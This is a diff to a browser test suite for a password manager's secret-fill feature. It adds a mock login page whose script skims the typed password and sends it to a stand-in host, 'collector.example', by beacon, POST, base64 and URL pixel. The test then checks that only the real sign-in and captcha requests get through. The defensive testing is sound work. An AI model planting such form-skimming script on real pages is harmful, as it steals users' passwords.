@@ -66,6 +66,8 @@ describe.skipIf(!chromePath)('native host secret fill', { timeout: 30_000 }, () 
   let logins: ReturnType<typeof testLoginStore>;
   const sockets = new Set<Socket>();
   const posts: Array<{ host: string; body: string }> = [];
+  /** Reads that reached the collector's site, as a page's CDN assets load. */
+  const assetReads: string[] = [];
   const parentDocuments: string[] = [];
 
   beforeAll(async () => {
@@ -124,6 +126,32 @@ describe.skipIf(!chromePath)('native host secret fill', { timeout: 30_000 }, () 
                 );
             else response.writeHead(200, { 'content-type': 'text/html' }).end('<h1>Signed in</h1>');
           });
+        } else if (host === 'collector.example') {
+          assetReads.push(request.url ?? '');
+          response.writeHead(200, { 'content-type': 'text/javascript' }).end('');
+        } else if (request.url === '/collecting-login') {
+          // The site's own sign-in posts to its own host; a third-party script on it copies the password elsewhere.
+          response.writeHead(200, { 'content-type': 'text/html' }).end(
+            `<form id="sign-in"><label>Email<input name="username" type="email"></label><label>Password<input name="password" type="password"></label><button type="submit">Log in</button></form><script>
+              const form = document.getElementById('sign-in');
+              const password = form.querySelector('[name=password]');
+              password.addEventListener('input', () => navigator.sendBeacon('https://collector.example/typed', password.value));
+              form.addEventListener('submit', async (event) => {
+                event.preventDefault();
+                const value = password.value;
+                navigator.sendBeacon('https://collector.example/beacon', JSON.stringify({ field: value }));
+                fetch('https://collector.example/collect', { method: 'POST', mode: 'no-cors', body: value }).catch(() => {});
+                fetch('https://collector.example/encoded', { method: 'POST', mode: 'no-cors', body: btoa(value) }).catch(() => {});
+                fetch('https://collector.example/pixel?p=' + encodeURIComponent(value), { mode: 'no-cors' }).catch(() => {});
+                await fetch('https://collector.example/cdn/app.js', { mode: 'no-cors' }).catch(() => {});
+                // An invisible captcha checks with its own site as the form submits, and the sign-in waits for it.
+                const verified = await fetch('https://captcha.example/verify', { method: 'POST', mode: 'no-cors', body: 'token=widget-token' }).then(() => true, () => false);
+                if (!verified) return;
+                await fetch('/sessions/create', { method: 'POST', body: new URLSearchParams(new FormData(form)) });
+                location.href = '/signed-in';
+              });
+            </script>`,
+          );
         } else if (request.url === '/otp-send' || request.url === '/otp-send-button') {
           const scripted = request.url === '/otp-send-button';
           response
@@ -261,6 +289,7 @@ describe.skipIf(!chromePath)('native host secret fill', { timeout: 30_000 }, () 
           'login.auth.example:443',
           'parent.example:443',
           'collector.example:443',
+          'captcha.example:443',
           'www.amazon.com:443',
         ].includes(request.url ?? '')
       ) {
@@ -304,6 +333,7 @@ describe.skipIf(!chromePath)('native host secret fill', { timeout: 30_000 }, () 
     );
     await browserConsentMigration.up(getDb());
     posts.length = 0;
+    assetReads.length = 0;
     parentDocuments.length = 0;
     const appeared = connection.context.waitForEvent('page');
     await connection.session.send('Target.createTarget', { url: 'about:blank', newWindow: true, background: true });
@@ -476,6 +506,26 @@ describe.skipIf(!chromePath)('native host secret fill', { timeout: 30_000 }, () 
     expect(posts).toEqual([]);
     expect(page.url()).not.toContain('collector.example');
     expect(await page.content()).not.toContain(secret);
+  });
+
+  it("keeps a filled password off other sites while the page's captcha and CDN requests still go", async () => {
+    const item = await saved('auth.example');
+    await page.goto('https://login.auth.example/collecting-login');
+    const result = await executeFillSecret(context(), {
+      item_handle: item.id,
+      ...(await refsFor({ username: 'Email', password: 'Password', submit: 'Log in' })),
+    });
+    await expect.poll(() => page.locator('h1').textContent()).toBe('Signed in');
+    expect(posts).toEqual([
+      { host: 'captcha.example', body: 'token=widget-token' },
+      {
+        host: 'login.auth.example',
+        body: new URLSearchParams({ username: 'principal@example.test', password: secret }).toString(),
+      },
+    ]);
+    expect(assetReads).toEqual(['/cdn/app.js']);
+    // Refused copies are the page's own business: the sign-in itself went through on the login's site.
+    expect(result).toEqual({ status: 'submitted' });
   });
 
   it('refuses a login saved for another site, saying which', async () => {
